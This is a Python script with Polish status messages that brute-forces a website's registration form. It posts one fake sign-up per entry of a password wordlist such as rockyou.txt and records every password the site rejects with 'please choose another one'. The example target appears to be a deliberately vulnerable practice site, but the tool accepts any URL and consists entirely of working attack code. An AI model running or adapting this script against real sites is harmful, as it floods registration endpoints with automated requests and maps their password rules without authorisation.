import requests
import datetime
import sys
from sys import exit

help_instructions = 'Help for user:\n- first parameter: enter the website address\n- second parameter: provide the path to the dictionary\n- third parameter: enter email address (deafult: kali@kali.pl)\n- fourth parameter: enter name (default: kali)\n- fifth parameter: enter the name (default: kali_kali)\nThe password confirmation field is completed automatically.\nStartup example:\npython3 workhome_python.py https://hack-yourself-first.com/Account/Register /usr/share/wordlists/rockyou.txt pawel@pawel.pl pawel kubacki'

if sys.argv[1] == '--help':
    print(help_instructions)
    exit()

url = sys.argv[1]
passwords_database = sys.argv[2]
email = ''
first_name = ''
last_name = ''
number_of_items_found = 0
number_of_lines_remaining = 0
name_of_file = datetime.datetime.now()
file_of_results = f'searching-{name_of_file.strftime("%m_%d_%Y_%H-%M-%S")}.txt'

if len(sys.argv[3]) > 0:
    email = sys.argv[3]
else:
    email = 'kali@kali.pl'

if len(sys.argv[4]) > 0:
    first_name = sys.argv[4]
else:
    first_name = 'kali'

if len(sys.argv[5]) > 0:
    last_name = sys.argv[5]
else:
    last_name = 'kali_kali'

create_file = open(file_of_results, 'w', encoding='utf-8')
create_file.close()

with open(passwords_database, 'rb') as file:
    lines = file.readlines()
    number_of_lines_remaining = len(lines)
    print(f'Ilosc pozycji do sprawdzenia: {number_of_lines_remaining}.\nParametry wyszukiwania:\n- Aim: {url}\n- Password database: {passwords_database}\n- Email: {email}\n- First name: {first_name}\n- Last name: {last_name}\n')
    file.close()

with open(passwords_database) as passwords:
    for password in passwords:
        params = {"Email": email, "FirstName": first_name, "LastName": last_name, "Password": password.strip('\n'), "ConfirmPassword": password.strip('\n')}
        req = requests.post(url, data=params)
        number_of_lines_remaining -= 1
        print(f"Znaleziono pozycji: {number_of_items_found}. Do sprawdzenia pozostalo pozycji: {number_of_lines_remaining}.", end='\r')
        if "please choose another one" in req.text:
            number_of_items_found += 1
            with open(rf"{file_of_results}", "a") as file_results:
                file_results.write(password)
                print(f'Znaleziono pozycji: {number_of_items_found}. Do sprawdzenia pozostalo pozycji: {number_of_lines_remaining}. ----------> Znalezione haslo: {password}', end='\r')
    print(f'\nZnaleziono pozycji: {number_of_items_found}. Do sprawdzenia pozostalo pozycji: {number_of_lines_remaining}.\nWyniki zostaly zapisane w pliku "{file_of_results}"')

with open(file_of_results, 'r+') as finaly_results:
    content = finaly_results.read()
    finaly_results.seek(0)
    finaly_results.write(f'Wyszukiwanie rozpoczeto: {name_of_file.strftime("%m/%d/%Y, %H:%M:%S")}.\nParametry wyszukiwania:\n- Email: {email}\n- First name: {first_name}\n- Last name: {last_name}\n- Password database: {passwords_database}\nWyszukiwanie zakonczono: {datetime.datetime.now().strftime("%m/%d/%Y, %H:%M:%S")}.\nZnaleziono pozycji: {number_of_items_found}.\n\n{content}')
